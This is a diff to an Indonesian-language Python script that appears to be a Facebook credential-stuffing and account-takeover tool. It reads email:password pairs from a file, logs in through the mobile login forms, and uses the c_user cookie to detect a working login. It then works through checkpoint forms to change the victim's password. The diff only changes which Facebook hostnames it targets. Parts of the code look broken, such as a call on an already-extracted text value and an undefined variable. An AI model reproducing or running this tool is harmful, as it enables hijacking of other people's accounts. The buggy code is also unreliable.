@@ -119,18 +119,18 @@ def babaz(pm,data):
 		try:idf,pw = user.split(pm)
 		except ValueError:exit("pemisah salah, file anda memakai pemisah "+user)
 		print(f"{M} |{P}\n[{k}•{P}]\nmencoba login ke\nemail : {k}{idf}\n{P}sandi : {k}{pw}{P}",end=' ')
-		ses.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua})
+		ses.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua})
 		if "y" in pro:
-			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",proxies=proxy).text,"html.parser")
+			soup=parser(ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8",proxies=proxy).text,"html.parser")
 		else:
-			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+			soup=parser(ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
 		link=soup.find("form",{"method":"post"})
 		data,data2 = {},{}
 		data_ubah,data_ubah2 = {},{}
 		for x in soup("input"):
 			data.update({x.get("name"):x.get("value")})
 		data.update({"email":idf,"pass":pw})
-		url=ses.post("https://mbasic.facebook.com"+link.get("action"),data=data)
+		url=ses.post("https://m.facebook.com"+link.get("action"),data=data)
 		response=parser(url.text, "html.parser")
 		if "c_user" in ses.cookies.get_dict():
 			if "Akun Anda Dikunci" in url.text:
@@ -149,7 +149,7 @@ def babaz(pm,data):
 			for x in response("input"):
 				if x.get("name") in listInput:
 					data2.update({x.get("name"):x.get("value")})
-			try:an=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data2)
+			try:an=ses.post("https://free.facebook.com"+link2.get("action"),data=data2)
 			except:time.sleep(1)
 			response2=parser(an.text,"html.parser")
 			cek=[cek.text for cek in response2.find_all("option")]
@@ -163,7 +163,7 @@ def babaz(pm,data):
 						for x in response("input"):
 							if x.get("name") in but:
 								data_ubah.update({x.get("name"):x.get("value")})
-						newpw=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data_ubah).text
+						newpw=ses.post("https://m.facebook.com"+link2.get("action"),data=data_ubah).text
 						url_ubahpw=parser(newpw.text,"html.parser")
 						get2=ubahPw.find("form",{"method":"post"})
 						submit2=["submit[Next]","nh","fb_dtsg","jazoest"]
